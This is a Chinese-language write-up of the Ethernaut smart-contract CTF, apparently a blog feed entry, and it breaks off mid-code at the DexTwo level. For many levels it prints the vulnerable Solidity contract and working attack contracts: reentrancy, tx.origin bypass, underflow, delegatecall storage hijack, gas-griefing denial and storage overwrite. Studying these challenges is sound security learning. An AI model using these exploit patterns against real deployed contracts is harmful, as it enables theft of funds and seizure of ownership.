        <content type="html"><![CDATA[<h1 id="ethernaut"><a href="#ethernaut" class="headerlink" title="ethernaut"></a>ethernaut</h1><hr><h2 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h2><pre><code>// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Fallback &#123;    mapping(address =&gt; uint) public contributions;    address public owner;    constructor() &#123;        owner = msg.sender;        contributions[msg.sender] = 1000 * (1 ether);    &#125;    modifier onlyOwner &#123;            require(                msg.sender == owner,                &quot;caller is not the owner&quot;            );            _;        &#125;    function contribute() public payable &#123;        require(msg.value &lt; 0.001 ether);        contributions[msg.sender] += msg.value;        if(contributions[msg.sender] &gt; contributions[owner]) &#123;        owner = msg.sender;        &#125;    &#125;    function getContribution() public view returns (uint) &#123;        return contributions[msg.sender];    &#125;    function withdraw() public onlyOwner &#123;        payable(owner).transfer(address(this).balance);    &#125;    receive() external payable &#123;        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);        owner = msg.sender;    &#125;    &#125;  </code></pre><p>题目要求：<br>1.成为owner<br>2.合约余额成为零<br>对于如何获得owner 可以看到在contribute函数中 当贡献的ether大于上一任owner的贡献 就会变为owner<br>但是在receive中 如果贡献不等于0并且msg.value不为零 那么直接获得owner<br>receive函数在合约接受eth时触发 那么我们要做的就是<br>1.contribute 1 wei<br>2.像合约中转入1 wei<br>3.调用withdraw<br><img src="e1.png" alt="e1"><br>经过这些操作 owner已经是我们自己 余额也被我们提走了<br><img src="e1.2.png" alt="e1.2"></p><h2 id="FallOut"><a href="#FallOut" class="headerlink" title="FallOut"></a>FallOut</h2><p>代码  </p><pre><code>// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &#39;openzeppelin-contracts-06/math/SafeMath.sol&#39;;contract Fallout &#123;    using SafeMath for uint256;    mapping (address =&gt; uint) allocations;    address payable public owner;    /* constructor */    function Fal1out() public payable &#123;        owner = msg.sender;        allocations[owner] = msg.value;    &#125;    modifier onlyOwner &#123;                require(                    msg.sender == owner,                    &quot;caller is not the owner&quot;                );                _;            &#125;    function allocate() public payable &#123;        allocations[msg.sender] = allocations[msg.sender].add(msg.value);    &#125;    function sendAllocation(address payable allocator) public &#123;        require(allocations[allocator] &gt; 0);        allocator.transfer(allocations[allocator]);    &#125;    function collectAllocations() public onlyOwner &#123;        msg.sender.transfer(address(this).balance);    &#125;    function allocatorBalance(address allocator) public view returns (uint)&#123;        return allocations[allocator];    &#125;&#125;  </code></pre><p>这个合约的问题在于 旧版的构造函数为与合约名称相同的函数，但是在0.6.0构造函数已经成为 constructor<br>所以我们每个人都可以任意调用Fallout函数成为owner然后调用collectAllcations<br>所以要做的：<br>1.调用fallout<br>2.调用collectAllcations<br><img src="2.png" alt="2">  </p><h2 id="CoinFlip"><a href="#CoinFlip" class="headerlink" title="CoinFlip"></a>CoinFlip</h2><p>代码  </p><pre><code>// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract CoinFlip &#123;    uint256 public consecutiveWins;    uint256 lastHash;    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;    constructor() &#123;        consecutiveWins = 0;    &#125;    function flip(bool _guess) public returns (bool) &#123;        uint256 blockValue = uint256(blockhash(block.number - 1));        if (lastHash == blockValue) &#123;        revert();        &#125;        lastHash = blockValue;        uint256 coinFlip = blockValue / FACTOR;        bool side = coinFlip == 1 ? true : false;        if (side == _guess) &#123;        consecutiveWins++;        return true;        &#125; else &#123;        consecutiveWins = 0;        return false;        &#125;    &#125;&#125;  </code></pre><p>题目要求：<br>连续猜对十次<br>这题考的是伪随机数漏洞<br>我们可以在攻击合约中先计算blockValue<br>然后根据计算结果再调用flip<br>由于两个交易时间相差很近 所以很大概率在一个区块中 那么值就不随机 成了可以计算的数<br>flip就很大概率成功<br>调用十次attack<br><img src="3.png" alt="3">  </p><h2 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h2><pre><code>// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Telephone &#123;    address public owner;    constructor() &#123;        owner = msg.sender;    &#125;    function changeOwner(address _owner) public &#123;        if (tx.origin != msg.sender) &#123;        owner = _owner;        &#125;    &#125;&#125;</code></pre><p>代码：  </p><pre><code>// SPDX-License-Identifier: MITpragma solidity ^0.8.0;    contract Telephone &#123;    address public owner;    constructor() &#123;        owner = msg.sender;    &#125;    function changeOwner(address _owner) public &#123;        if (tx.origin != msg.sender) &#123;        owner = _owner;        &#125;    &#125;&#125;</code></pre><p>题目要求：<br>成为owner<br>这题考察tx.origin和msg.sender的区别<br>tx.origin是交易最初的发起方  msg.sender是调用者的地址<br>比如 用户a 调用 合约a 来调用合约b<br>那么在b中 合约b的msg.sender为合约a 但是tx.origin为用户a<br>那么这一题的完成方式就很简单  用一个中间合约带哦有changeOwner就可以了<br>攻击合约：<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p><pre><code>interface telephone&#123;    function changeOwner(address _owner) external;&#125;contract telephoneAttack&#123;    address target;    constructor(address _target) public&#123;        target = _target;    &#125;    function attack(address owner) public &#123;        telephone(target).changeOwner(owner);    &#125;&#125;</code></pre><p><img src="4.png" alt="4"></p><h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><p>代码</p><pre><code>// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Token &#123;    mapping(address =&gt; uint) balances;    uint public totalSupply;    constructor(uint _initialSupply) public &#123;        balances[msg.sender] = totalSupply = _initialSupply;    &#125;    function transfer(address _to, uint _value) public returns (bool) &#123;        require(balances[msg.sender] - _value &gt;= 0);        balances[msg.sender] -= _value;        balances[_to] += _value;        return true;    &#125;    function balanceOf(address _owner) public view returns (uint balance) &#123;        return balances[_owner];    &#125;&#125;</code></pre><p>题目要求：获得尽量大的余额  </p><p>观察transfer函数balances[msg.sender] - _value &gt;= 0存在下溢<br>我们初始有20个代币 那我们转21个就可以让balance的值成为uint256的最大值获得大量余额<br><img src="5.png" alt="5"></p><h2 id="delegatecall"><a href="#delegatecall" class="headerlink" title="delegatecall"></a>delegatecall</h2><p>代码：<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p><pre><code>contract Delegate &#123;    address public owner;    constructor(address _owner) &#123;        owner = _owner;    &#125;    function pwn() public &#123;        owner = msg.sender;    &#125;    &#125;    contract Delegation &#123;    address public owner;    Delegate delegate;    constructor(address _delegateAddress) &#123;        delegate = Delegate(_delegateAddress);        owner = msg.sender;    &#125;    fallback() external &#123;        (bool result,) = address(delegate).delegatecall(msg.data);        if (result) &#123;        this;        &#125;    &#125;&#125;</code></pre><p>题目要求：<br>成为owner<br>题目直接交互的合约是delegation<br>这里考delegatecall，一个合约调用delegatecall的时候，实行目标合约的逻辑 但是环境还是本合约的 也就是说逻辑改变的合约状态应该是本合约的<br>两个合约的owner占用相应的储存槽一样 那么delegation的delegatecall调用pwn改变的owner其实是delegation的owner<br>那么我们要做的：<br>1.构造msg.data<br>2.触发fallback<br>data 如何构造？<br>我们要调用一个函数 就要用它的函数选择器和传入的参数进行拼接，构造data在发送交易时传入，但是这个pwn没有参数 所以只需传入函数选择器就行<br>fallback函数如何触发？<br>两个条件会触发fallback<br>1.接受到eth且无receive函数<br>2.调用了合约不存在的函数<br>bytes public data = abi.encodeWithSignature(“pwn()”);</p><p>算出 data 为 0xdd365b8b<br>然后发送交易传data就行啦<br><img src="6.png" alt="6"></p><h2 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h2><p>题目是个空合约 ，要求我们转入一些eth 但是这个合约没有fallback和recieve 不能接受eth<br>有一个方法可以强制给一个地址转入eth<br>那就是selfdestruct<br>可以在合约自毁前把余额强制转给传入的address  </p><h2 id="vault"><a href="#vault" class="headerlink" title="vault"></a>vault</h2><p>代码  </p><pre><code>// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Vault &#123;    bool public locked;    bytes32 private password;    constructor(bytes32 _password) &#123;        locked = true;        password = _password;    &#125;    function unlock(bytes32 _password) public &#123;        if (password == _password) &#123;        locked = false;        &#125;    &#125;&#125;</code></pre><p>题目要求我们获得password 但他是private 我们不能访问<br>但是这个数据是储存在链上的，链上的信息都是公开的<br>我们可以借助web3.js查询链上合约插槽找到 password<br>可以看到locked占据插槽0<br>password占据插槽1  直接查插槽1<br>然后调unlock<br><img src="7.png" alt="7"></p><h2 id="Reentrance"><a href="#Reentrance" class="headerlink" title="Reentrance"></a>Reentrance</h2><p>代码<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.6.12;</p><pre><code>import &#39;openzeppelin-contracts-06/math/SafeMath.sol&#39;;contract Reentrance &#123;    using SafeMath for uint256;    mapping(address =&gt; uint) public balances;    function donate(address _to) public payable &#123;        balances[_to] = balances[_to].add(msg.value);    &#125;    function balanceOf(address _who) public view returns (uint balance) &#123;        return balances[_who];    &#125;    function withdraw(uint _amount) public &#123;        if(balances[msg.sender] &gt;= _amount) &#123;        (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);        if(result) &#123;            _amount;        &#125;        balances[msg.sender] -= _amount;        &#125;    &#125;    receive() external payable &#123;&#125;&#125;  </code></pre><p>代码的问题在于withdraw的时候先进行转账再进行余额减少  所以如果我们在fallback中重复调用withdraw  产生重入<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;<br>    interface re{<br>        function donate(address _to) external;<br>        function withdraw(uint _amount) external;<br>    }<br>    contract attack{<br>        address target;<br>        uint amount;<br>        uint count;<br>        constructor(address _target) public payable{<br>            target = _target;<br>        }<br>        function Attack(uint _amount) public payable{<br>            target.call{value: msg.value}(abi.encodeWithSelector(re.donate.selector,address(this)));<br>            amount = _amount;<br>            re(target).withdraw(amount);<br>        }<br>        fallback() external payable{<br>            if(count == 0){<br>                re(target).withdraw(amount);<br>                count++;<br>            }<br>        }<br>    }</p><p>调用attack传入目标合约余额 就可以完成挑战<br><img src="8.png" alt="8"></p><h2 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h2><p>代码<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p><pre><code>interface Building &#123;    function isLastFloor(uint) external returns (bool);&#125;contract Elevator &#123;    bool public top;    uint public floor;    function goTo(uint _floor) public &#123;        Building building = Building(msg.sender);        if (! building.isLastFloor(_floor)) &#123;        floor = _floor;        top = building.isLastFloor(floor);        &#125;    &#125;&#125;</code></pre><p>要完成这个题要使top为true 要完成函数逻辑 需要函数第一次返回false 第二次返回true<br>可以设一个count 第一次返回false 第二次返回true  </p><p>// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br>interface goto{<br>     function goTo(uint _floor) external;</p><p>}<br>contract firstAttack{<br>    address target;<br>    int count = 0;<br>    constructor(address _target) public{<br>        target = _target;<br>    }<br>    function attack() public {<br>        goto(target).goTo(1);<br>    }</p><pre><code>function isLastFloor(uint) external returns (bool)&#123;    if(count == 0)&#123;        count++;        return false;    &#125;    else&#123;        return true;    &#125;&#125;</code></pre><p>}</p><p>调用attack 可完成挑战<br><img src="9.png" alt="9"></p><h2 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h2><p>代码<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p><pre><code>contract Privacy &#123;    bool public locked = true;    uint256 public ID = block.timestamp;    uint8 private flattening = 10;    uint8 private denomination = 255;    uint16 private awkwardness = uint16(block.timestamp);    bytes32[3] private data;    constructor(bytes32[3] memory _data) &#123;        data = _data;    &#125;    function unlock(bytes16 _key) public &#123;        require(_key == bytes16(data[2]));        locked = false;    &#125;    /*        A bunch of super advanced solidity algorithms...        ,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`        .,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,        *.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^         ,---/V\        `*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.    ~|__(o.o)        ^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;  UU  UU    */&#125;</code></pre><p>这题考链上数据的储存规则<br>要我们找到data【2】插槽位置<br>由于data是定长数据类型 符合顺序储存<br>如果按一个数据类型占用一个插槽的话那么data【2】应该在插槽7  但是经过查询发现在插槽5<br>明显uin8 uint8 uint16的数据存在打包  联合占用了一个插槽  具体请看solidity文档<br><img src="10.png" alt="10"><br><img src="10.2.png" alt="10.2">  </p><h2 id="gateKeeperOne"><a href="#gateKeeperOne" class="headerlink" title="gateKeeperOne"></a>gateKeeperOne</h2><p>代码<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p><pre><code>contract GatekeeperOne &#123;    address public entrant;    modifier gateOne() &#123;        require(msg.sender != tx.origin);        _;    &#125;    modifier gateTwo() &#123;        require(gasleft() % 8191 == 0);        _;    &#125;    modifier gateThree(bytes8 _gateKey) &#123;        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);        require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);        _;    &#125;    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;        entrant = tx.origin;        return true;    &#125;&#125;</code></pre><p>要通过大门 我们必须通过三道防卫（函数修饰符）<br>第一个要求很容易 只需要我们通过合约调用函数就可以<br>第三个要求涉及数据类型转换 要我们构造符合要求的key<br>require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)))<br> 要求key取后四位和后八位结果一致<br>require(uint32(uint64(_gateKey)) != uint64(_gateKey))<br>要求key取后八位和key原来的结果不一致<br>require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)))<br>要求key的四位是我们自己恶的地址<br>我的地址为0x34B91dA4A48DdE39d19A0DEecF3616aba752210C<br>那么我根据自己地址构造出来的key就是  0x111111110000210c</p><p>最后看第二个条件<br>要求函数运行至此 gasleft正好为8191的整数倍<br>循环暴力跑出来<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;<br>    interface gate{<br>    function enter(bytes8 _gateKey) external;<br>    }<br>    contract Attack{<br>        address target;<br>        bytes8 key = 0x111111110000210c;<br>        bool public got;<br>        constructor(address _target) public {<br>            target = _target;<br>        }<br>        function attack() public {<br>            for(uint i = 0 ;i&lt;10000;i++){<br>                (bool success,) = target.call{gas: 30000+i}(abi.encodeWithSelector(gate.enter.selector,key));<br>                if(success){<br>                    got = true;<br>                    break;<br>                }<br>            }<br>        }<br>    }  </p><p>调用 attack 然后看got是否返回true<br><img src="11.png" alt="11">  </p><h2 id="gatekeepertwo"><a href="#gatekeepertwo" class="headerlink" title="gatekeepertwo"></a>gatekeepertwo</h2><p>代码<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p><pre><code>contract GatekeeperTwo &#123;    address public entrant;    modifier gateOne() &#123;        require(msg.sender != tx.origin);        _;    &#125;    modifier gateTwo() &#123;        uint x;        assembly &#123; x := extcodesize(caller()) &#125;        require(x == 0);        _;    &#125;    modifier gateThree(bytes8 _gateKey) &#123;        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);        _;    &#125;    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;        entrant = tx.origin;        return true;    &#125;&#125;  </code></pre><p>和上个题的目标一样  突破三道防线<br>防线1 要求通过合约调用<br>防线2 要求调用者地址代码长度为0  要通过这个验证 我们只需要在构造函数中完成调用 这样因为合约还未完成构造 检验出的代码长度就是0<br>防线3 要求调用地址和key经异或运算符合一个等式<br>异或的一个性质<br>a ^ b = c  则 a ^ c = b<br>那么我们已知 a c 要求b  那么只需要计算 a^c就可以</p><pre><code>// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface gate&#123;    function enter(bytes8 _gateKey) external;&#125;contract attack&#123;    constructor(address target) public &#123;        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;        gate(target).enter(bytes8(key));    &#125;&#125;</code></pre><p><img src="12.png" alt="12">  </p><h2 id="NaughtCoin"><a href="#NaughtCoin" class="headerlink" title="NaughtCoin"></a>NaughtCoin</h2><p>代码<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p><pre><code>import &#39;openzeppelin-contracts-08/token/ERC20/ERC20.sol&#39;;contract NaughtCoin is ERC20 &#123;    // string public constant name = &#39;NaughtCoin&#39;;    // string public constant symbol = &#39;0x0&#39;;    // uint public constant decimals = 18;    uint public timeLock = block.timestamp + 10 * 365 days;    uint256 public INITIAL_SUPPLY;    address public player;    constructor(address _player)     ERC20(&#39;NaughtCoin&#39;, &#39;0x0&#39;) &#123;        player = _player;        INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));        // _totalSupply = INITIAL_SUPPLY;        // _balances[player] = INITIAL_SUPPLY;        _mint(player, INITIAL_SUPPLY);        emit Transfer(address(0), player, INITIAL_SUPPLY);    &#125;    function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;        super.transfer(_to, _value);    &#125;    // Prevent the initial owner from transferring tokens until the timelock has passed    modifier lockTokens() &#123;        if (msg.sender == player) &#123;        require(block.timestamp &gt; timeLock);        _;        &#125; else &#123;        _;        &#125;    &#125; &#125; </code></pre><p>题目是个erc20标准代币  它重写了transfer函数 对转账做出了限制<br>要求十年以后才能转账<br>但是erc20还有一个转账函数transferFrom<br>题目未对他进行限制<br>只需在转账前对自己进行授权  然后把钱转出就行<br><img src="13.png" alt="13">  </p><h2 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h2><p>代码<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p><pre><code>contract Preservation &#123;    // public library contracts     address public timeZone1Library;    address public timeZone2Library;    address public owner;     uint storedTime;    // Sets the function signature for delegatecall    bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) &#123;        timeZone1Library = _timeZone1LibraryAddress;         timeZone2Library = _timeZone2LibraryAddress;         owner = msg.sender;    &#125;    // set the time for timezone 1    function setFirstTime(uint _timeStamp) public &#123;        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));    &#125;    // set the time for timezone 2    function setSecondTime(uint _timeStamp) public &#123;        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));    &#125;&#125;// Simple library contract to set the timecontract LibraryContract &#123;    // stores a timestamp     uint storedTime;      function setTime(uint _time) public &#123;        storedTime = _time;    &#125;&#125;</code></pre><p>这题还考delegatecall  调用delegatecall时运行目标合约的逻辑，但是改变的是自己的环境<br>题目要求我们成为owner<br>可以看到调用LibraryContract的setTime改变的是插槽0的数值<br>在preservation合约中插槽0储存的是timeZone1Library的地址 我们可以把它更改为自己的攻击合约地址<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p><pre><code>contract attack&#123;    address public timeZone1Library;    address public timeZone2Library;    address public owner;     function setTime(uint _time) public &#123;        owner = address(0x34B91dA4A48DdE39d19A0DEecF3616aba752210C);    &#125;&#125;</code></pre><p>然后再调用我们的攻击合约 owner就被夺取了  </p><h2 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h2><p>代码<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p><pre><code>contract Recovery &#123;    //generate tokens    function generateToken(string memory _name, uint256 _initialSupply) public &#123;        new SimpleToken(_name, msg.sender, _initialSupply);    &#125;&#125;contract SimpleToken &#123;    string public name;    mapping (address =&gt; uint) public balances;    // constructor    constructor(string memory _name, address _creator, uint256 _initialSupply) &#123;        name = _name;        balances[_creator] = _initialSupply;    &#125;    // collect ether in return for tokens    receive() external payable &#123;        balances[msg.sender] = msg.value * 10;    &#125;    // allow transfers of tokens    function transfer(address _to, uint _amount) public &#123;         require(balances[msg.sender] &gt;= _amount);        balances[msg.sender] = balances[msg.sender] - _amount;        balances[_to] = _amount;    &#125;    // clean up after ourselves    function destroy(address payable _to) public &#123;        selfdestruct(_to);    &#125;&#125;</code></pre><p>代码中可以得知调用generateToken可以new一个SimpleToken 但是他们失去了SimpleToken的地址 要我们找到这个地址<br>题目本意是让我们了解creat1方法<br>keccak256(address, nonce)<br> 但是可以通过查询Recovery链上合约交易信息直接找到SimpleToken的地址<br><img src="15.1.png" alt="15.1"></p><pre><code>// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface simple&#123;    function destroy(address payable _to) external;&#125;contract attack&#123;    address target;    constructor(address _target)public &#123;        target = _target;    &#125;    function Attack(address payable add) public&#123;        simple(target).destroy(add);    &#125;&#125;</code></pre><p>传入simpleToken地址再调用Attack<br><img src="15.2.png" alt="15.2">  </p><h2 id="AlienCodex"><a href="#AlienCodex" class="headerlink" title="AlienCodex"></a>AlienCodex</h2><p>代码<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.5.0;</p><pre><code>import &#39;../helpers/Ownable-05.sol&#39;;contract AlienCodex is Ownable &#123;    bool public contact;    bytes32[] public codex;    modifier contacted() &#123;        assert(contact);        _;    &#125;    function make_contact() public &#123;        contact = true;    &#125;    function record(bytes32 _content) contacted public &#123;        codex.push(_content);    &#125;    function retract() contacted public &#123;        codex.length--;    &#125;    function revise(uint i, bytes32 _content) contacted public &#123;        codex[i] = _content;    &#125;&#125;  </code></pre><p>这题还考储存<br>插槽0 是owner和contract打包储存<br>可以看到合约提供了修改数组数据的函数  codex数组是变长数组 先占据了插槽1储存数组长度<br>开始长度为0<br>那么如果调用retract（） 就会发生下溢 数组的长度变得很大  可以覆盖所有插槽<br>我们就可以通过改变数组的值改变owner（储存在插槽0）<br>我们先算出变长数组第一个元素的储存位置  其余元素顺序储存<br>keccak256（1）<br>然后用uint256的max减去算出的值再加1 就是owner在数组的元素位置<br>  bytes32 public data = keccak256(abi.encode(1));<br>  uint256 public b  = type(uint256).max-uint256(data);<br>  （算出来的b要加1）</p><p>算出来为35707666377435648211887908874984608119992236509074197713628505308453184860938<br><img src="16.1.png" alt="16.1"><br><img src="16.3.png" alt="16.3"><br><img src="16.2.png" alt="16.2"><br>owner已经变为我们自己了  </p><h2 id="Denial"><a href="#Denial" class="headerlink" title="Denial"></a>Denial</h2><p>代码<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;<br>    contract Denial {</p><pre><code>        address public partner; // withdrawal partner - pay the gas, split the withdraw        address public constant owner = address(0xA9E);        uint timeLastWithdrawn;        mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances        function setWithdrawPartner(address _partner) public &#123;            partner = _partner;        &#125;        // withdraw 1% to recipient and 1% to owner        function withdraw() public &#123;            uint amountToSend = address(this).balance / 100;            // perform a call without checking return            // The recipient can revert, the owner will still get their share            partner.call&#123;value:amountToSend&#125;(&quot;&quot;);            payable(owner).transfer(amountToSend);            // keep track of last withdrawal time            timeLastWithdrawn = block.timestamp;            withdrawPartnerBalances[partner] +=  amountToSend;        &#125;        // allow deposit of funds        receive() external payable &#123;&#125;        // convenience function        function contractBalance() public view returns (uint) &#123;            return address(this).balance;        &#125;&#125;</code></pre><p>要求我们组止 owner withdraw（）<br>看到withdraw是会给partner转钱  触发partner的receive函数<br>我们可以在receive函数中耗尽交易gas  这样交易就会失败<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;<br>    contract Denial {<br>    receive() external payable{<br>        uint amount = gasleft();<br>        for(int i = 0;i&lt;10000000000000000000000000000;i++){<br>            address(0).call{gas: amount}(“”);<br>        }<br>    }<br>    }<br>把这个合约的地址设为partner就可以成功  </p><h2 id="shop"><a href="#shop" class="headerlink" title="shop"></a>shop</h2><p>代码<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p><pre><code>interface Buyer &#123;function price() external view returns (uint);&#125;contract Shop &#123;    uint public price = 100;    bool public isSold;    function buy() public &#123;        Buyer _buyer = Buyer(msg.sender);        if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;        isSold = true;        price = _buyer.price();        &#125;    &#125;&#125;  </code></pre><p>要求最后成交的price小于100<br>这要求price（）返回不同的值  price（）是view函数 不能改变内部合约的数据 那也就不能计数  但是可以通过读取外部合约数据的变化来返回不同的值<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p><pre><code>interface Buyer &#123;function price() external view returns (uint);&#125;contract Shop &#123;uint public price = 100;bool public isSold;function buy() public &#123;    Buyer _buyer = Buyer(msg.sender);    if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;    isSold = true;    price = _buyer.price();    &#125;&#125;&#125;contract attack &#123;    Shop target;    constructor(address _target) public&#123;        target = Shop(_target);    &#125;    function Attack() public&#123;        target.buy();    &#125;    function price() external view returns (uint)&#123;        if(target.isSold())&#123;            return 0;        &#125;        return 101;    &#125;&#125;//当isSold不是true 返回101 如果是true 返回0  </code></pre><p>调用attack<br><img src="17.png" alt="17">  </p><h2 id="Dex"><a href="#Dex" class="headerlink" title="Dex"></a>Dex</h2><p>代码<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p><pre><code>import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;import &#39;openzeppelin-contracts-08/access/Ownable.sol&#39;;contract Dex is Ownable &#123;    address public token1;    address public token2;    constructor() &#123;&#125;    function setTokens(address _token1, address _token2) public onlyOwner &#123;        token1 = _token1;        token2 = _token2;    &#125;    function addLiquidity(address token_address, uint amount) public onlyOwner &#123;        IERC20(token_address).transferFrom(msg.sender, address(this), amount);    &#125;    function swap(address from, address to, uint amount) public &#123;        require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);        require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);        uint swapAmount = getSwapPrice(from, to, amount);        IERC20(from).transferFrom(msg.sender, address(this), amount);        IERC20(to).approve(address(this), swapAmount);        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);    &#125;    function getSwapPrice(address from, address to, uint amount) public view returns(uint)&#123;        return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));    &#125;    function approve(address spender, uint amount) public &#123;        SwappableToken(token1).approve(msg.sender, spender, amount);        SwappableToken(token2).approve(msg.sender, spender, amount);    &#125;    function balanceOf(address token, address account) public view returns (uint)&#123;        return IERC20(token).balanceOf(account);    &#125;&#125;contract SwappableToken is ERC20 &#123;    address private _dex;    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) &#123;            _mint(msg.sender, initialSupply);            _dex = dexInstance;    &#125;    function approve(address owner, address spender, uint256 amount) public &#123;        require(owner != _dex, &quot;InvalidApprover&quot;);        super._approve(owner, spender, amount);    &#125;&#125;  </code></pre><p>题目提供了一个代币交易所  可以允许我们对token1和token2进行交换<br>合约有token0和token1各100个 我们的任务是从两个代币各十个开始 换光里边的任意一个代币<br>经过简单的计算可以发现  swap函数的代币价格计算方法有点问题 没有手续费的情况下只要进行交换  那么我们两个代币总余额就会变多<br>所以只要一直进行交换操作 就可以让一个余额为0<br><img src="18.1.png" alt="18.1"><br><img src="18.2.png" alt="18.2"><br><img src="18.3.png" alt="18.3"><br><img src="18.4.png" alt="18.4">  </p><h2 id="dex2"><a href="#dex2" class="headerlink" title="dex2"></a>dex2</h2><p>代码<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p><pre><code>import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;import &#39;openzeppelin-contracts-08/access/Ownable.sol&#39;;contract DexTwo is Ownable &#123;    address public token1;    address public token2;    constructor() &#123;&#125;    function setTokens(address _token1, address _token2) public onlyOwner &#123;        token1 = _token1;        token2 = _token2;    &#125;    function add_liquidity(address token_address, uint amount) public onlyOwner &#123;        IERC20(token_address).transferFrom(msg.sender, address(this), amount);    &#125;    function swap(address from, address to, uint amount) public &#123;        require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);        uint swapAmount = getSwapAmount(from, to, amount);        IERC20(from).transferFrom(msg.sender, address(this), amount);        IERC20(to).approve(address(this), swapAmount);        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);    &#125;     function getSwapAmount(address from, address to, uint amount) public view returns(uint)&#123;        return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));    &#125;    function approve(address spender, uint amount) public &#123;        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);    &#125;    function balanceOf(address token, address account) public view returns (uint)&#123;        return IERC20(token).balanceOf(account);    &#125;    &#125;    contract SwappableTokenTwo is ERC20 &#123;    address private _dex;    constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) &#123;            _mint(msg.sender, 